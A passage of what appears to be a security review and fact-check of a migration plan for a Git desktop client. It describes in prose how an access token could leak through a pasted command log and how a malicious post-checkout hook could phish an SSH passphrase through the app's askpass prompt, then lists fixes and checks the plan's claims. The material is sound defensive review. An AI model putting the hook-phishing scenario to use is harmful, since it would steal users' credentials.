  - **Token leak:** a user clones a private GitLab repo using a token-in-URL, hits a bug, and pastes "Nhật ký lệnh" (the command log) into a public issue as instructed, publishing the token.
  - **Passphrase phishing:**
    - A repo's `post-checkout` hook waits 3 minutes, then asks Thaigit's askpass server for the SSH key passphrase.
    - The user sees the genuine Thaigit modal and types it.
    - The hook can already read the key file, so it now has a usable key.
- **Evidence:**
  - `phase-02-rust-backend-bridge.md:24` — "sidecar `thaigit-askpass` gọi về app qua localhost kèm token"; `:45` — env "`THAIGIT_ASKPASS_PORT/TOKEN`"; `:56` — "bind `127.0.0.1:0` và sinh token 32 byte … Timeout 5 phút"; `:83` — "token ngẫu nhiên mỗi phiên"
  - `Sources/NhanhCore/Git/GitRunner.swift:109-115` — logs `arguments` and `stderr.prefix(4000)`
  - `Sources/NhanhCore/Git/GitRepository.swift:630` — `["clone", "--progress", "--", url, destination.path]`; `:559` — `["remote", "add", name, url]`
  - `phase-03-typescript-core-port.md:49` — "ghi `CommandLog`"; `phase-05-staging-diff-conflicts-drag-drop.md:30` — "nhật ký lệnh git"
  - `phase-09-windows-hardening-qa-launch.md:74` — "log chẩn đoán (nhật ký lệnh git) người dùng có thể copy gửi"; `:55` — "link GitHub Issues"
- **Suggested fix:**
  - **Askpass:**
    - Give each operation its own askpass token: `git_exec` creates it only for network ops and revokes it when the process exits.
    - Reject requests when no matching operation is running.
    - Show the operation (for example "git push origin") and the parsed host in the modal.
    - Reject prompts that contain control characters or percent-encoded `@` or `/` in the host.
  - **Command log:**
    - At record time, redact `scheme://user:pass@` to `scheme://***@`, and mask known token patterns in both the CommandLog argv and stderr.
    - Strip userinfo from clone URLs and send it through askpass instead.
    - Make "Copy diagnostics" show a redacted preview.

---

## Fact-check (sampled claims per phase)

| # | Claim (location) | Result | Evidence |
|---|---|---|---|
| 1 | `git/` has no repo of its own; it is untracked in the parent (phase-01:20) | VERIFIED | `git rev-parse --show-toplevel` → the parent directory; parent status `?? git/` (since resolved: the repo now has its own public GitHub repo) |
| 2 | Rename targets exist: Info.plist, build-app.sh, WelcomeView.swift, askpass title + App Support dir in GitEnvironment.swift (phase-01:43) | VERIFIED | GitEnvironment.swift:141,149,156 (`with title "Nhánh"`), :166 (`"Nhanh"`); build-app.sh:48 |
| 3 | 11,467 Swift lines; 40 tests; core ≈ 2.8k lines (scout-report:3,5) | VERIFIED | `wc`: 11,467 (Sources+Tests); 40 `@Test`; NhanhCore 2,791 |
| 4 | Paths always go via `--pathspec-from-file`, "never argv" (scout-report:27; phase-03:78 "mọi path qua stdin") | FAILED | GitRepository.swift:159, 169, 171, 173, 188, 486-489 pass paths in argv after `--` |
| 5 | Env is "giữ nguyên như Swift … `LANGUAGE=C`" (phase-02:45) | FAILED | GitEnvironment.swift:43 sets `LANGUAGE = "en"`. The plan's list also omits `GIT_MERGE_AUTOEDIT=no`, `GIT_PAGER`/`PAGER=cat`, `LC_ALL` removal and the `LANG` default (:36-41) |
| 6 | Cancel sends SIGTERM in Swift (scout-report:9) | VERIFIED | ProcessRunner.swift:147 `process.terminate()` |
| 7 | TestRepo isolates config with `GIT_CONFIG_GLOBAL=/dev/null` and `GIT_CONFIG_NOSYSTEM=1` (scout-report:34) | VERIFIED | TestSupport.swift:25-26 |
| 8 | About 80 repository operations (phase-03:26) | VERIFIED | 80 `public func`/`public static func` in GitRepository.swift |
| 9 | Graph test "5k commits < 2 s" (phase-03:52) | VERIFIED | GraphLayoutTests.swift:97,105 |
| 10 | 12-colour lane palette in GraphStyle.swift (phase-04:51) | VERIFIED | GraphStyle.swift:14-26 |
| 11 | Sidebar pages 200 at a time and collapses folders with > 30 branches (phase-04:21) | VERIFIED | SidebarView.swift:351 (`sidebarPageStep = 200`), :398 (`count <= 30`) |
| 12 | `toNode`/`fromNode` curves in GraphCells.swift (phase-04:57) | VERIFIED | GraphCells.swift:55,68; GraphLayout.swift:9,11 |
| 13 | `dropOptions` in RepoModel+Actions (phase-05:16) | VERIFIED | RepoModel+Actions.swift:1202 |
| 14 | DiffPresentation turns tabs into 4 spaces and caps lines at 1,200 chars (phase-05:51) | VERIFIED | DiffPresentation.swift:32, :67 |
| 15 | Phase 6 and Phase 7 agree on `/v1/install`, `/v1/ai/*`, `/v1/ai/quota` | VERIFIED | phase-06:17,41 ↔ phase-07:37-41 |
| 16 | `X-Install-Id` is sent only with consent (phase-07:29; phase-08:33,75; phase-09:33) | FAILED | phase-06:32 (registration on first run), phase-06:41 (always sent on AI calls) |
| 17 | Updater response `{version,notes,pub_date,url,signature}` / 204 (phase-07:43) | VERIFIED | Tauri updater docs |
| 18 | Updater template `{{target}}/{{arch}}/{{current_version}}` (phase-08:33) | VERIFIED | Tauri docs: target ∈ linux / windows / darwin |
| 19 | research-01:107 "`{{target}}`: windows/macos/linux" | FAILED | Tauri uses `darwin`; the plan's phase-08:45 correctly uses `darwin-…` |
| 20 | "không lưu nội dung" on the path through Nous Research (phase-06:30) | FAILED (as worded) | Nous Portal privacy policy (2026-09-28): collects prompts and outputs; no-store/no-train only under Privacy Mode |
| 21 | Git ≥ 2.35 is an acceptable floor (phase-02:55, phase-09:30) | FAILED (security) | CVE-2022-23521 (CVSS 9.8) affects 2.35.0–2.35.5; fixed in 2.35.6 |
| 22 | The ≥ 2.35 rationale is `--pathspec-from-file`, `switch`, `restore` (phase-02:55) | UNVERIFIED | Those features look older than 2.35 (not re-checked against release notes). No 2.35-only flag such as `stash --staged` found in GitRepository.swift |
| 23 | research-01:46,52 "GitButler shells git CLI (not gitoxide/git2) … No libgit2" | FAILED | gitbutler's workspace Cargo.toml declares `git2 = "0.21.0"` and `gix = "0.87.1"` |
| 24 | research-02:37: Ultra tier = "800 RPM, 8M TPM" | FAILED (internal) | research-02:19 says Ultra = 1,600 RPM, 16M TPM |
| 25 | Hermes-4-70B costs $0.05/$0.20 per 1M tokens and has a 128k context (phase-07:27, phase-06:20) | UNVERIFIED | Not re-checked; research-02:80 says "~4k context" and plan.md:67 says this was corrected |
| 26 | Pay-as-you-go RPM/TPM is enough without a subscription (phase-07:27) | UNVERIFIED | No source given; research-02:16 lists Free = 45 RPM / 450k TPM |
| 27 | PDPL "hiệu lực 2026" (phase-07:119) | UNVERIFIED | Not re-checked |

## Unresolved questions
1. Does `/admin/api/releases` accept admin-session cookies, or only `CI_RELEASE_TOKEN`? The answer changes Finding 8's severity.
2. Will the GitHub repo be public (fork-PR CI, cache scope)? This affects how far Finding 6 hardening must go.
3. For this account, does Nous Portal send Hermes traffic to third-party providers, and is Privacy Mode available on pay-as-you-go?
4. Which RPM/TPM tier applies to a pay-as-you-go Nous account (Finding 3 sizing)?

## Sources
- [Tauri v2 updater plugin docs](https://v2.tauri.app/plugin/updater/)
- [Nous Portal privacy policy](https://portal.nousresearch.com/privacy)
- [GitHub blog — Git security vulnerabilities announced (CVE-2022-23521)](https://github.blog/open-source/git/git-security-vulnerabilities-announced-2/)
- [gitbutler workspace Cargo.toml](https://raw.githubusercontent.com/gitbutlerapp/gitbutler/master/Cargo.toml)
